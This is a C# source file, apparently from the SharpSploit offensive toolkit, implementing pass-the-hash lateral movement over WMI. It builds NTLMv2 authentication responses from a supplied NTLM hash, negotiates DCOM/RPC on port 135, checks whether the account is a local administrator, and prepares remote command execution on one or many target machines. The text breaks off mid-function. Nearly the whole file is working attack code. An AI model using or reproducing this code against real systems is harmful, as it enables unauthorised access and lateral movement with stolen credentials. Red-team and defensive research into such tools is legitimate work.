using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using SharpSploit.Execution;
using SharpSploit.Misc;

namespace SharpSploit.LateralMovement
{
    public class PassTheHash
    {
        /// <summary>
        /// Determines if a username and hash has administrative privilege on a target
        /// </summary>
        /// <param name="username">The Username to query.</param>
        /// <param name="hash">The NTLM hash for the user</param>
        /// <param name="domain">The logon domain for the user</param>
        /// <param name="target">The target to query.</param>
        /// <returns>True for Admin, False for not.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static bool WMIAdminCheck(string username, string hash, string domain, string target)
        {
            string result = WMIExecute(username, hash, domain, target, AdminCheck: true);
            if (result.Contains(" is a local administrator on "))
                return true;
            else
                return false;
        }

        /// <summary>
        /// Execute a command against multiple targets using Pass the Hash and WMI
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="targets">The target computers to run the command on.</param>
        /// <param name="command">The Command to execute on the target</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="AdminCheck">Check if user is an Admin on the target only.</param>
        /// <param name="debug">Include debug information in the output</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string WMIExecute(string username, string hash, string domain, List<string> targets, string command = "", int sleep = 15, bool AdminCheck = false, bool debug = false)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var target in targets)
            {
                sb.AppendLine(WMIExecute(username, hash, domain, target, command, sleep, AdminCheck, debug));
            }

            return sb.ToString();
        }

        /// <summary>
        /// Execute a command against a target using Pass the Hash and WMI
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="target">The target computers to run the command on.</param>
        /// <param name="command">The Command to execute on the target.</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="AdminCheck">Check if user is an Admin on the target only.</param>
        /// <param name="debug">Include debug information in the output.</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string WMIExecute(string username, string hash, string domain, string target, string command = "", int sleep = 15, bool AdminCheck = false, bool debug = false)
        {
            //Change this name
            string target_short = String.Empty;
            string processID = BitConverter.ToString(BitConverter.GetBytes(Process.GetCurrentProcess().Id)).Replace("-00-00", "").Replace("-", "");
            string auth_hostname = Environment.MachineName;
            string output_username = String.Empty;
            string WMI_random_port_string = null;
            string target_long = String.Empty;
            string WMI_client_stage = String.Empty;
            string WMI_data = String.Empty;
            string OXID = String.Empty;
            StringBuilder output = new StringBuilder();
            //Change this name
            int request_split_stage = 0;
            int request_length = 0;
            int sequence_number_counter = 0;
            int request_split_index_tracker = 0;
            int request_auth_padding = 0;
            int OXID_index = 0;
            int OXID_bytes_index = 0;
            int WMI_random_port_int = 0;
            int target_process_id = 0;
            bool success = false;
            IPAddress target_type = null;
            byte[] object_UUID = null;
            byte[] IPID = null;
            byte[] WMI_client_send;
            byte[] object_UUID2 = null;
            byte[] sequence_number = null;
            byte[] request_flags = null;
            byte[] process_ID_Bytes = Utilities.ConvertStringToByteArray(processID);
            byte[] request_call_ID = null;
            byte[] request_opnum = null;
            byte[] request_UUID = null;
            byte[] request_context_ID = null;
            byte[] alter_context_call_ID = null;
            byte[] alter_context_context_ID = null;
            byte[] alter_context_UUID = null;
            byte[] hostname_length = null;
            byte[] stub_data = null;
            byte[] WMI_namespace_length = null;
            byte[] WMI_namespace_unicode = null;
            byte[] IPID2 = null;

            if (!string.IsNullOrEmpty(hash) && !string.IsNullOrEmpty(username))
            {
                if (hash.Contains(":"))
                    hash = hash.Split(':').Last();
            }
            else
            {
                return "Missing Required Parameters";
            }


            if (!string.IsNullOrEmpty(domain))
                output_username = domain + '\\' + username;
            else
                output_username = username;

            if (target == "localhost")
            {
                target = "127.0.0.1";
                target_long = "127.0.0.1";
            }

            try
            {
                if (debug) { output.AppendLine(String.Format("Connecting to: {0}", target)); }
                target_type = IPAddress.Parse(target);
                target_short = target_long = target;
            }
            catch
            {
                target_long = target;

                if (target.Contains("."))
                {
                    int target_short_index = target.IndexOf(".");
                    target_short = target.Substring(0, target_short_index);
                }
                else
                {
                    target_short = target;
                }
            }

            var WMI_client = new TcpClient();

            try
            {
                WMI_client.Connect(target, 135);
            }
            catch
            {
                return "No Response from: " + target;
            }

            if (WMI_client.Connected)
            {
                if (debug) { output.AppendLine(String.Format("Connected to: {0}", target)); }
                //Get Stream for WMI Client Connection
                NetworkStream WMI_client_stream = WMI_client.GetStream();
                byte[] WMI_client_receive = new byte[2048];
                byte[] RPC_UUID = new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a };
                OrderedDictionary packet_RPC = WMIExec.RPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x02 }, new byte[] { 0x00, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
                packet_RPC["RPCBind_FragLength"] = new byte[] { 0x74, 0x00 };
                WMI_client_receive = SendStream(WMI_client_stream, Utilities.ConvertFromPacketOrderedDictionary(packet_RPC));
                byte[] assoc_group = Utilities.GetByteRange(WMI_client_receive, 20, 23);
                packet_RPC = WMIExec.RPCRequest(new byte[] { 0x03 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x05, 0x00 }, null);
                WMI_client_receive = SendStream(WMI_client_stream, Utilities.ConvertFromPacketOrderedDictionary(packet_RPC));
                string WMI_hostname = BitConverter.ToString(Utilities.GetByteRange(WMI_client_receive, 42, WMI_client_receive.Length));
                byte[] WMI_hostname_bytes = Utilities.ConvertStringToByteArray(WMI_hostname.Substring(0, WMI_hostname.IndexOf("-00-00-00")).Replace("-00", "").Replace("-", "").Replace(" ", ""));
                WMI_hostname_bytes = Utilities.GetByteRange(WMI_hostname_bytes, 0, WMI_hostname_bytes.Length);
                WMI_hostname = Encoding.ASCII.GetString(WMI_hostname_bytes);
                if (target_short != WMI_hostname)
                {
                    if (debug) { output.AppendLine(String.Format("Switching target name to {0} due to initial response.", WMI_hostname)); }
                    target_short = WMI_hostname;
                }
                WMI_client.Close();
                WMI_client_stream.Close();
                WMI_client = new TcpClient();
                WMI_client.ReceiveTimeout = 30000;

                try
                {
                    WMI_client.Connect(target_long, 135);
                }
                catch
                {
                    output.AppendLine(String.Format("No response from {0}", target));
                    return output.ToString();
                }

                if (WMI_client.Connected)
                {
                    if (debug) { output.AppendLine(String.Format("ReConnected to: {0} ", target)); }
                    if (debug) { output.AppendLine("Authenticating"); }
                    WMI_client_stream = WMI_client.GetStream();
                    RPC_UUID = new byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
                    packet_RPC = WMIExec.RPCBind(3, new byte[] { 0xd0, 0x16 }, new byte[] { 0x01 }, new byte[] { 0x01, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
                    packet_RPC["RPCBind_FragLength"] = new byte[] { 0x78, 0x00 };
                    packet_RPC["RPCBind_AuthLength"] = new byte[] { 0x28, 0x00 };
                    packet_RPC["RPCBind_NegotiateFlags"] = new byte[] { 0x07, 0x82, 0x08, 0xa2 };
                    WMI_client_receive = SendStream(WMI_client_stream, Utilities.ConvertFromPacketOrderedDictionary(packet_RPC));
                    assoc_group = Utilities.GetByteRange(WMI_client_receive, 20, 23);
                    string WMI_NTLMSSP = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                    int WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf("4E544C4D53535000");
                    int WMI_NTLMSSP_bytes_index = WMI_NTLMSSP_index / 2;
                    int WMI_domain_length = Utilities.DataLength(WMI_NTLMSSP_bytes_index + 12, WMI_client_receive);
                    int WMI_target_length = Utilities.DataLength(WMI_NTLMSSP_bytes_index + 40, WMI_client_receive);
                    byte[] WMI_session_ID = Utilities.GetByteRange(WMI_client_receive, 44, 51);
                    byte[] WMI_NTLM_challenge = Utilities.GetByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 24, WMI_NTLMSSP_bytes_index + 31);
                    byte[] WMI_target_details = Utilities.GetByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 56 + WMI_domain_length, WMI_NTLMSSP_bytes_index + 55 + WMI_domain_length + WMI_target_length);
                    byte[] WMI_target_time_bytes = Utilities.GetByteRange(WMI_target_details, WMI_target_details.Length - 12, WMI_target_details.Length - 5);
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < hash.Length - 1; i += 2) { sb.Append(hash.Substring(i, 2) + "-"); };
                    byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
                    string[] hash_string_array = sb.ToString().Split('-');
                    byte[] auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                    byte[] auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                    byte[] auth_username_bytes = Encoding.Unicode.GetBytes(username);
                    byte[] auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                    auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                    byte[] auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                    auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                    byte[] auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                    auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                    byte[] auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                    byte[] auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                    byte[] auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                    byte[] auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                    byte[] auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                    HMACMD5 HMAC_MD5 = new HMACMD5();
                    HMAC_MD5.Key = NTLM_hash_bytes;
                    string username_and_target = username.ToUpper();
                    byte[] username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                    byte[] username_and_target_bytes = null;
                    username_and_target_bytes = username_bytes.Concat(auth_domain_bytes).ToArray<byte>();
                    byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                    Random r = new Random();
                    byte[] client_challenge_bytes = new byte[8];
                    r.NextBytes(client_challenge_bytes);
                    byte[] security_blob_bytes = (new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(WMI_target_time_bytes)
                        .Concat(client_challenge_bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                        .Concat(WMI_target_details)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                    
                    byte[] server_challenge_and_security_blob_bytes = WMI_NTLM_challenge.Concat(security_blob_bytes).ToArray();
                    HMAC_MD5.Key = NTLMv2_hash;
                    byte[] NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                    byte[] session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                    NTLMv2_response = NTLMv2_response.Concat(security_blob_bytes).ToArray();
                    byte[] NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                    NTLMv2_response_length = new byte[] { NTLMv2_response_length[0], NTLMv2_response_length[1] };
                    byte[] WMI_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);
                    byte[] WMI_session_key_length = new byte[] { 0x00, 0x00 };
                    byte[] WMI_negotiate_flags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };
                    
                    byte[] NTLMSSP_response = (new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 })
                        .Concat(auth_LM_offset)
                        .Concat(NTLMv2_response_length)
                        .Concat(NTLMv2_response_length)
                        .Concat(auth_NTLM_offset)
                        .Concat(auth_domain_length)
                        .Concat(auth_domain_length)
                        .Concat(auth_domain_offset)
                        .Concat(auth_username_length)
                        .Concat(auth_username_length)
                        .Concat(auth_username_offset)
                        .Concat(auth_hostname_length)
                        .Concat(auth_hostname_length)
                        .Concat(auth_hostname_offset)
                        .Concat(WMI_session_key_length)
                        .Concat(WMI_session_key_length)
                        .Concat(WMI_session_key_offset)
                        .Concat(WMI_negotiate_flags)
                        .Concat(auth_domain_bytes)
                        .Concat(auth_username_bytes)
                        .Concat(auth_hostname_bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(NTLMv2_response).ToArray();

                    assoc_group = Utilities.GetByteRange(WMI_client_receive, 20, 23);
                    packet_RPC = WMIExec.RPCAuth3(NTLMSSP_response);
                    WMI_client_send = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC);
                    WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                    WMI_client_stream.Flush();
                    byte[] causality_ID_bytes = new byte[16];
                    r.NextBytes(causality_ID_bytes);
                    OrderedDictionary packet_DCOM_remote_create_instance = WMIExec.DCOMRemoteCreateInstance(causality_ID_bytes, target_short);
                    byte[] DCOM_remote_create_instance = Utilities.ConvertFromPacketOrderedDictionary(packet_DCOM_remote_create_instance);
                    packet_RPC = WMIExec.RPCRequest(new byte[] { 0x03 }, DCOM_remote_create_instance.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x01, 0x00 }, new byte[] { 0x04, 0x00 }, null);
                    WMI_client_send = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC).Concat(DCOM_remote_create_instance).ToArray();
                    WMI_client_receive = SendStream(WMI_client_stream, WMI_client_send);
                    TcpClient WMI_client_random_port = new TcpClient();
                    WMI_client_random_port.Client.ReceiveTimeout = 30000;

                    if (WMI_client_receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_client_receive, 24, 27)) == "05-00-00-00")
                    {
                        output.AppendLine("WMI Access Denied");
                        return output.ToString();
                    }
                    else if (WMI_client_receive[2] == 3)
                    {
                        string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                        string[] error_code_array = error_code.Split('-');
                        error_code = string.Join("", error_code_array);
                        output.AppendLine(String.Format("Error Code: 0x{0}", error_code.ToString()));
                        return output.ToString();
                    }
                    else if (WMI_client_receive[2] == 2 && AdminCheck)
                    {
                        output.AppendLine(String.Format("{0} is a local administrator on {1}", output_username, target_long));
                        if (debug) { output.AppendLine("Exiting due to AdminCheck being set"); }
                        return output.ToString();
                    }
                    else if (WMI_client_receive[2] == 2 && !AdminCheck)
                    {
                        if (debug) { output.AppendLine("Continuing since AdminCheck is false"); }
                        if (target_short == "127.0.0.1")
                        {
                            target_short = auth_hostname;
                        }
                        byte[] target_unicode = (new byte[] { 0x07, 0x00 }).Concat(Encoding.Unicode.GetBytes(target_short + "[")).ToArray();
                        string target_search = BitConverter.ToString(target_unicode).Replace("-", "");
                        string WMI_message = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                        int target_index = WMI_message.IndexOf(target_search);

                        if (target_index < 1)
                        {
                            IPAddress[] target_address_list = Dns.GetHostEntry(target_long).AddressList;
                            foreach (IPAddress ip in target_address_list)
                            {
                                target_short = ip.Address.ToString();
                                target_search = BitConverter.ToString(target_unicode).Replace("-", "");
                                target_index = WMI_message.IndexOf(target_search);

                                if (target_index >= 0)
                                {
                                    break;
                                }
                            }
                        }

                        if (target_index > 0)
                        {
                            int target_bytes_index = target_index / 2;
                            byte[] WMI_random_port_bytes = Utilities.GetByteRange(WMI_client_receive, target_bytes_index + target_unicode.Length, target_bytes_index + target_unicode.Length + 8);
                            WMI_random_port_string = BitConverter.ToString(WMI_random_port_bytes);
                            int WMI_random_port_end_index = WMI_random_port_string.IndexOf("-5D");
                            if (WMI_random_port_end_index > 0)
                            {
                                WMI_random_port_string = WMI_random_port_string.Substring(0, WMI_random_port_end_index);
                            }
                            WMI_random_port_string = WMI_random_port_string.Replace("-00", "").Replace("-", "");
                            char[] random_port_char_array = WMI_random_port_string.ToCharArray();
                            char[] chars = new char[] { random_port_char_array[1], random_port_char_array[3], random_port_char_array[5], random_port_char_array[7], random_port_char_array[9] };
                            WMI_random_port_int = int.Parse(new string(chars));
                            string reverse = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                            int reverse_index = reverse.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820");
                            int reverse_bytes_index = reverse_index / 2;
                            byte[] OXID_bytes = Utilities.GetByteRange(WMI_client_receive, reverse_bytes_index + 32, reverse_bytes_index + 39);
                            IPID = Utilities.GetByteRange(WMI_client_receive, reverse_bytes_index + 48, reverse_bytes_index + 63);
                            OXID = BitConverter.ToString(OXID_bytes).Replace("-", "");
                            OXID_index = reverse.IndexOf(OXID, reverse_index + 100);
                            OXID_bytes_index = OXID_index / 2;
                            object_UUID = Utilities.GetByteRange(WMI_client_receive, OXID_bytes_index + 12, OXID_bytes_index + 27);
                        }
                        if (WMI_random_port_int != 0)
                        {
                            try
                            {
                                WMI_client_random_port.Connect(target_long, WMI_random_port_int);
                            }
                            catch
                            {
                                output.AppendLine(String.Format("{0}:{1} did not respond", target_long, WMI_random_port_int));
                                return output.ToString();
                            }
                        }
                        else
                        {
                            output.AppendLine(String.Format("Random port extraction failure"));
                            return output.ToString();
                        }
                    }
                    else
                    {
                        output.AppendLine("An Unkonwn Error Occured");
                        return output.ToString();
                    }

                    if (WMI_client_random_port.Connected)
                    {
                        if (debug) { output.AppendLine(String.Format("Connected to: {0} using port {1}", target_long, WMI_random_port_int)); }
                        NetworkStream WMI_client_random_port_stream = WMI_client_random_port.GetStream();
                        packet_RPC = WMIExec.RPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x03 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }, new byte[] { 0x00, 0x00 });
                        packet_RPC["RPCBind_FragLength"] = new byte[] { 0xd0, 0x00 };
                        packet_RPC["RPCBind_AuthLength"] = new byte[] { 0x28, 0x00 };
                        packet_RPC["RPCBind_NegotiateFlags"] = new byte[] { 0x97, 0x82, 0x08, 0xa2 };
                        WMI_client_send = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC);
                        WMI_client_receive = SendStream(WMI_client_random_port_stream, WMI_client_send);
                        assoc_group = Utilities.GetByteRange(WMI_client_receive, 20, 23);
                        WMI_NTLMSSP = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                        WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf("4E544C4D53535000");
                        WMI_NTLMSSP_bytes_index = WMI_NTLMSSP_index / 2;
                        WMI_domain_length = Utilities.DataLength(WMI_NTLMSSP_bytes_index + 12, WMI_client_receive);
                        WMI_target_length = Utilities.DataLength(WMI_NTLMSSP_bytes_index + 40, WMI_client_receive);
                        WMI_session_ID = Utilities.GetByteRange(WMI_client_receive, 44, 51);
                        WMI_NTLM_challenge = Utilities.GetByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 24, WMI_NTLMSSP_bytes_index + 31);
                        WMI_target_details = Utilities.GetByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 56 + WMI_domain_length, WMI_NTLMSSP_bytes_index + 55 + WMI_domain_length + WMI_target_length);
                        WMI_target_time_bytes = Utilities.GetByteRange(WMI_target_details, WMI_target_details.Length - 12, WMI_target_details.Length - 5);
                        sb = new StringBuilder();
                        for (int i = 0; i < hash.Length - 1; i += 2) { sb.Append(hash.Substring(i, 2) + "-"); };
                        NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
                        hash_string_array = sb.ToString().Split('-');
                        auth_hostname = Environment.MachineName;
                        auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                        auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                        auth_username_bytes = Encoding.Unicode.GetBytes(username);
                        auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                        auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                        auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                        auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                        auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                        auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                        auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                        auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                        auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                        auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                        auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                        HMAC_MD5 = new HMACMD5();
                        HMAC_MD5.Key = NTLM_hash_bytes;
                        username_and_target = username.ToUpper();
                        username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                        username_and_target_bytes = username_bytes.Concat(auth_domain_bytes).ToArray();
                        NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                        r = new Random();
                        client_challenge_bytes = new byte[8];
                        r.NextBytes(client_challenge_bytes);
                        
                        security_blob_bytes = (new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(WMI_target_time_bytes)
                        .Concat(client_challenge_bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                        .Concat(WMI_target_details)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();

                        server_challenge_and_security_blob_bytes = WMI_NTLM_challenge.Concat(security_blob_bytes).ToArray();
                        HMAC_MD5.Key = NTLMv2_hash;
                        NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                        session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                        byte[] client_signing_constant = new byte[] { 0x73, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x74, 0x6f, 0x20, 0x63, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x2d, 0x74, 0x6f, 0x2d, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x20, 0x73, 0x69, 0x67, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x6d, 0x61, 0x67, 0x69, 0x63, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x00 };
                        MD5CryptoServiceProvider MD5_crypto = new MD5CryptoServiceProvider();
                        byte[] client_signing_key = MD5_crypto.ComputeHash(session_base_key.Concat(client_signing_constant).ToArray());
                        NTLMv2_response = NTLMv2_response.Concat(security_blob_bytes).ToArray();
                        NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                        NTLMv2_response_length = new byte[] { NTLMv2_response_length[0], NTLMv2_response_length[1] };
                        WMI_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);
                        WMI_session_key_length = new byte[] { 0x00, 0x00 };
                        WMI_negotiate_flags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };
                        NTLMSSP_response = (new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 })
                            .Concat(auth_LM_offset)
                            .Concat(NTLMv2_response_length)
                            .Concat(NTLMv2_response_length)
                            .Concat(auth_NTLM_offset)
                            .Concat(auth_domain_length)
                            .Concat(auth_domain_length)
                            .Concat(auth_domain_offset)
                            .Concat(auth_username_length)
                            .Concat(auth_username_length)
                            .Concat(auth_username_offset)
                            .Concat(auth_hostname_length)
                            .Concat(auth_hostname_length)
                            .Concat(auth_hostname_offset)
                            .Concat(WMI_session_key_length)
                            .Concat(WMI_session_key_length)
                            .Concat(WMI_session_key_offset)
                            .Concat(WMI_negotiate_flags)
                            .Concat(auth_domain_bytes)
                            .Concat(auth_username_bytes)
                            .Concat(auth_hostname_bytes)
                            .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                            .Concat(NTLMv2_response).ToArray();

                        HMAC_MD5.Key = client_signing_key;
                        sequence_number = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                        packet_RPC = WMIExec.RPCAuth3(NTLMSSP_response);
                        packet_RPC["RPCAUTH3_CallID"] = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                        packet_RPC["RPCAUTH3_AuthLevel"] = new byte[] { 0x04 };
                        WMI_client_send = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC);
                        WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                        WMI_client_random_port_stream.Flush();
                        packet_RPC = WMIExec.RPCRequest(new byte[] { 0x83 }, 76, 16, 4, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x03, 0x00 }, object_UUID);
                        OrderedDictionary packet_rem_query_interface = WMIExec.DCOMRemQueryInterface(causality_ID_bytes, IPID, new byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 });
                        OrderedDictionary packet_NTLMSSP_verifier = WMIExec.NTLMSSPVerifier(4, new byte[] { 0x04 }, sequence_number);
                        byte[] rem_query_interface = Utilities.ConvertFromPacketOrderedDictionary(packet_rem_query_interface);
                        byte[] NTLMSSP_verifier = Utilities.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                        HMAC_MD5.Key = client_signing_key;
                        byte[] RPC_Sign = sequence_number.Concat(Utilities.ConvertFromPacketOrderedDictionary(packet_RPC))
                            .Concat(rem_query_interface)
                            .Concat(Utilities.GetByteRange(NTLMSSP_verifier, 0, 11)).ToArray();
                        
                        byte[] RPC_signature = HMAC_MD5.ComputeHash(RPC_Sign);
                        RPC_signature = Utilities.GetByteRange(RPC_signature, 0, 7);
                        packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = RPC_signature;
                        NTLMSSP_verifier = Utilities.ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);

                        WMI_client_send = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC)
                            .Concat(rem_query_interface)
                            .Concat(NTLMSSP_verifier).ToArray();

                        WMI_client_receive = SendStream(WMI_client_random_port_stream, WMI_client_send);
                        WMI_client_stage = "exit";

                        if (WMI_client_receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_client_receive, 24, 27)) == "05-00-00-00")
                        {
                            output.AppendLine(String.Format("{0} WMI access denied on {1}", output_username, target_long));
                            return output.ToString();
                        }
                        else if (WMI_client_receive[2] == 3 && BitConverter.ToString(Utilities.GetByteRange(WMI_client_receive, 24, 27)) != "05-00-00-00")
                        {
                            string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                            string[] error_code_array = error_code.Split('-');
                            error_code = string.Join("", error_code_array);
                            output.AppendLine(String.Format("Error Code: 0x{0}", error_code.ToString()));
                            return output.ToString();
                        }
                        else if (WMI_client_receive[2] == 2)
                        {
                            WMI_data = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                            OXID_index = WMI_data.IndexOf(OXID);
                            OXID_bytes_index = OXID_index / 2;
                            object_UUID2 = Utilities.GetByteRange(WMI_client_receive, OXID_bytes_index + 16, OXID_bytes_index + 31);
                            WMI_client_stage = "AlterContext";
                        }
                        else
                        {
